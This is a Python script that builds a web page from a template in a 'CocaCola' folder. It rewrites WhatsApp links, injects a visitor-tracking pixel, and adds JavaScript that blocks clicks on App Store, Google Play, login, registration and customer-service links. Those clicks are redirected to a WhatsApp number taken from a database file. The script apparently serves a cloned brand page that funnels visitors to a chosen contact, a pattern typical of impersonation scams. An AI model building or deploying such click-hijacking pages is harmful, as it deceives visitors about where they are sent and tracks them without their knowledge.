import os, json

BASE_DIR = r'd:\CocaCola'
db_path = os.path.join(BASE_DIR, 'database.json')
with open(db_path, 'r', encoding='utf-8') as f:
    db = json.load(f)
wa_num = db.get('whatsapp_number', '5511933684266')

with open(os.path.join(BASE_DIR, 'template.html'), 'r', encoding='utf-8') as f:
    html = f.read()

html = html.replace('https://wa.me/5511933684266', '/redirect_whatsapp')
html = html.replace('https://wa.me/5511971730325', '/redirect_whatsapp')
html = html.replace("'https://wa.me/5511933684266'", "'/redirect_whatsapp'")
html = html.replace("'https://wa.me/5511971730325'", "'/redirect_whatsapp'")
html = html.replace('https://api.whatsapp.com/send?phone=5511933684266', '/redirect_whatsapp')
html = html.replace('5511933684266', wa_num)

js_patch = """
<script>
// Advanced Tracking System (Pixel de Entrada e Saída SVR)
(function() {
  let userId = 'unknown';
  try {
      userId = localStorage.getItem('coca_user_id');
      if (!userId) {
          userId = Math.random().toString(36).substring(7);
          localStorage.setItem('coca_user_id', userId);
      }
  } catch(e) {}

  // Registra Entrada
  fetch('/api/v1/pixel', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ event: 'ENTRADA', url: window.location.href, userId: userId })
  }).catch(err => console.log(err));

  // Intercepta todos os cliques do site
  document.addEventListener('click', function(e) {
    var target = e.target;
    var a = target.closest('a');
    var text = (target.innerText || '').toLowerCase();
    
    var isAppStore = a && a.href && a.href.includes('apple.com');
    var isGooglePlay = a && a.href && a.href.includes('play.google.com');
    var isBadgeOrStore = target.closest('[class*="badge"]') || isAppStore || isGooglePlay || 
                         (a && a.getAttribute('href') && (a.getAttribute('href').includes('redirect_whatsapp') || a.getAttribute('href').includes('wa.me') || a.getAttribute('href').includes('/login') || a.getAttribute('href').includes('pre-registration'))) || 
                         text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar');
    
    if (isBadgeOrStore) { 
        var action = 'geral';
        if (isAppStore) action = 'appstore';
        else if (isGooglePlay) action = 'googleplay';
        else if (text.includes('atendimento') || text.includes('atendente')) action = 'atendimento';
        else if (text.includes('cadastre') || text.includes('cadastrar') || (a && a.href && a.href.includes('pre-registration'))) action = 'cadastro';
        else if (a && a.href && a.href.includes('login')) action = 'login';
        
        e.preventDefault();
        
        // Registra o Clique de Saída
        fetch('/api/v1/pixel', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ event: 'SAIDA_WHATSAPP', url: window.location.href, userId: userId, action: action })
        }).catch(err => console.log(err)).finally(() => {
            window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action);
        });
    }
  });
})();
</script>
"""
if '</body>' in html:
    html = html.replace('</body>', js_patch + '</body>')
else:
    html += js_patch

with open(os.path.join(BASE_DIR, 'index.html'), 'w', encoding='utf-8') as f:
    f.write(html)
with open(os.path.join(BASE_DIR, 'deploy', 'index.html'), 'w', encoding='utf-8') as f:
    f.write(html)
print("index.html generated!")
